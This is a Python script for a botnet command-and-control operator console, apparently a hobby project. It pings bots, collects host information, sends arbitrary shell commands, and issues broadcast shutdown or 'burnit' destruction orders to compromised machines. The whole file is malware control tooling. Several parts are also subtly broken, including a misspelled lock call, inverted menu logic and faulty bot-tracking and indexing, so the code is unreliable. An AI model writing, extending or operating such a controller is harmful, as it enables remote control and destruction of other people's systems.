#!/usr/bin/python3
import shutil
import threading
import channel
import time
import sys

print("initializing communications...")
rx = channel.Receiver()
rx_thread = threading.Thread(target=rx.start)
if sys.argv[1] != "nocap":
    rx_thread.start()
else:
    print("WARNING: Running in debug mode. Cannot receive communications.")


class bot_obj:
    def __init__(self, ID: str):
        self.identifier = ID
        self.last_ping = time.time()
        self.online = True


botlist: list[bot_obj]
botlist = []
lastpingsent = 0


def show_header():
    width = shutil.get_terminal_size()[0]
    print("C2 Interface v0.1".center(width, " "))
    print("-".center(width, "-"))


def main_menu():
    show_header()
    for i in rx.messages:
        if i.finalized and i.payload == "rtm":
            print("\nWarning! your last command failed to transmit! Please try again.")
            rx.tlock.acquire()
            rx.messages.remove(i)
            rx.tlock.release()
    print("\nMain Menu:\n")
    print("1) Test Connection to Bot")
    print("2) Query Host Information")
    print("3) Run Command")
    print("4) Danger Zone")
    print("5) Exit")
    if time.time() - lastpingsent > 1000:
        print("\nWarning: network status may be out of date, please re-test connections.")
    match input("\n Please Select an Option: "):
        case "1":
            test_conn()
        case "2":
            show_info()
        case "3":
            arbitrary_exec()
        case "4":
            danger_menu()
        case "5":
            print("\n\nGoodbye.\n")
            exit()
        case _:
            print("\n\n\nBad input! Please enter a number from 1 to 5. \n\n")
            main_menu()


def show_bots():
    global botlist, lastpingsent
    onlist = []
    offlist = []
    for i in botlist:
        if lastpingsent - i.last_ping > 60:
            i.online = False
            offlist.append(i)
        else:
            onlist.append(i)
    print("Active Bots".center(20, "-"))
    for i in onlist:
        print("- {}".format(i.identifier))
    if len(onlist) == 0:
        print("NONE")
    print("")
    print("Offline Bots".center(20, "-"))
    for i in onlist:
        print("- {}; last online {} seconds ago".format(i.identifier, i.last_ping))
    if len(offlist) == 0:
        print("NONE")


def test_conn():
    global botlist, lastpingsent
    # Command: send back ok response
    # Example response: "r0001ok"
    # Breakdown of ex: 1st char: message is response, 2nd-5th char: bot ID, 6th-7th chars: ok message
    lastpingsent = time.time()
    send("ping")
    print("Waiting 30 seconds for responses...")
    start = time.time()
    while time.time() - start < 30:
        for i in rx.messages:
            if i.finalized and i.payload[0] == "r" and i.payload[5:7] == "ok":
                rx.tlock.aquire()
                rx.messages.remove(i)
                rx.tlock.release()
                newbot = True
                for b in botlist:
                    if b.identifier == i.payload[1:5]:
                        newbot = True
                        b.last_ping = time.time()
                if newbot:
                    print("New bot registered!")
                    botlist.append(bot_obj(i.payload[1:5]))
        time.sleep(0.5)
    print("Ping results:")
    show_bots()
    input("\nPress return to continue. ")
    main_menu()


def show_info():
    # Command: respond with sys info (space separated)
    send("info", get_target())
    print("Waiting 1 minute for response...")
    start = time.time()
    res = ""
    while time.time() - start <= 60 and len(res) == 0:
        for i in rx.messages:
            if i.finalized and i.payload[0] == "r" and i.payload[5:8] == "st:":
                res = i.payload[8:]
                rx.tlock.aquire()
                rx.messages.remove(i)
                rx.tlock.release()
                break
        time.sleep(0.5)
    if len(res) == 0:
        print("Failed to communicate.")
        main_menu()
    res = res.split(" ")
    fields = ["Hostname", "IP", "Kernel", "uptime"]
    counter = 0
    for _ in fields:
        counter += 1
        print("{}: {}".format(fields[counter], res[counter]))
    main_menu()


def arbitrary_exec():
    print("I hope you know what you're doing!")
    tmp = input("Command to execute: $ ")
    # Command: ArBitrary eXecution
    tmp = "abx:" + tmp
    send(tmp, get_target())
    pass


def danger_menu():
    show_header()
    print("WARNING: This menu is Dangerous! If you want to proceed, type 'proceed' without the quotes")
    if input(": ") != "proceed":
        print("1) Shutdown Host")
        print("2) Decommission Network")
        print("0) Exit Menu")
        tmp = input("\n Please Select an Option: ")
        if tmp == "1" or tmp == "2":
            danger_zone(int(tmp))
    main_menu()


def danger_zone(opt: int):
    width = shutil.get_terminal_size()[0]
    print("WARNING: Are you SURE you know what you're doing?".center(width, "="))
    a = input("Type 'double dog sure' : ")
    if a != " double dog sure":
        print("operation aborted.")
        main_menu()
        exit()
    match opt:
        case 1:
            send("shutdown", get_target())
        case 2:
            send("burnit", get_target())
        case _:
            print("Unexpected fatal error")
            exit()
    main_menu()


def send(payload: str, target="0000"):
    print("Sending command, please wait...")
    payload = "r" + target + payload
    tmp = channel.Message(payload)
    tmp.send()
    print("sent")


def get_target():
    global botlist
    print("Please enter the identifier of the bot to target or 0000 for broadcast.")
    print("You may also press enter to view the list of known bots.")
    selection = input("Identifier: ")
    if selection == "0000":
        return selection
    for i in botlist:
        if i.identifier == selection:
            return selection
    print("\n\n\nThat wasn't a valid identifier. Here's the list of identifiers available:")
    show_bots()
    return get_target()

main_menu()
